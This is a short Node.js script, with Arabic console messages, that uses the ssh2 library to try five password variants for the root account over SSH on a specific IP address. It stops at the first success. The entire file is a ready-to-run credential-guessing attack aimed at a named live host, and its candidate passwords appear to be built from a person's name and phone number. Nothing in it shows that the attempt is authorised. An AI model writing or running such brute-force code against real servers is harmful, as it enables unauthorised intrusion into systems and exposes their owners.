const { Client } = require("ssh2");

const passwords = [
  "Ali@0164569934",
  "ali@0164569934",
  "Ali@0164569934!",
  "Ali0164569934",
  "ali0164569934",
];

function tryPass(pass) {
  return new Promise((resolve) => {
    const conn = new Client();
    let done = false;
    const t = setTimeout(() => {
      if (!done) { done = true; conn.end(); resolve(false); }
    }, 8000);
    conn.on("ready", () => { 
      if (!done) { done = true; clearTimeout(t); conn.end(); resolve(true); }
    });
    conn.on("error", () => {
      if (!done) { done = true; clearTimeout(t); resolve(false); }
    });
    conn.connect({
      host: "76.13.40.219",
      port: 22,
      username: "root",
      password: pass,
      readyTimeout: 7000,
    });
  });
}

(async () => {
  for (const p of passwords) {
    console.log(`تجربة: "${p}" ...`);
    const ok = await tryPass(p);
    console.log(ok ? "  ✓ نجح!" : "  ✗ فشل");
    if (ok) break;
  }
})();
